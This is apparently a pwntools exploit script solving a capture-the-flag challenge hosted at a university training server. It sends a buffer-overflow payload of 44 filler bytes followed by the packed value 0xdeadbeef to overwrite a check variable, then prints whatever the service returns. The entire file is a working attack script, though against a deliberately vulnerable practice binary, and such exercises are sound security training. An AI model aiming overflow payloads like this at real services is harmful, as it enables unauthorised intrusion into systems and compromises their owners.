from pwn import p64, remote, process

r = remote('cyberchallenge.disi.unitn.it', 9001)
# r = process('./bin')

offset = 44
check = 0xdeadbeef

r.sendlineafter(b'?', b'A' * offset + p64(check))

res = r.recvall(timeout=1)
print(res.decode(errors='ignore'))
